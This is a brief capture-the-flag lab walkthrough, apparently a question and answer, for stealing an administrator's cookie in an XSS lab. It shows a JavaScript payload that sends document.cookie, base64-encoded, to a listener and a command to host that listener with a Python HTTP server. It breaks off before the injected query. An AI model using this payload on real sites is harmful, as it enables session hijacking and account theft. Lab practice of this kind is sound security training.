Question: Steal the administrator's cookie in the lab "Cross-Site Scripting (XSS) 1" to obtain the flag.

```
1. Create a js file with
echo 'document.location="http://127.0.0.1:8000/?c="+btoa(document.cookie);' > test.js

2. Now host a Python HTTP server
python3 -m http.server 8000

3. On the lab give the query
```
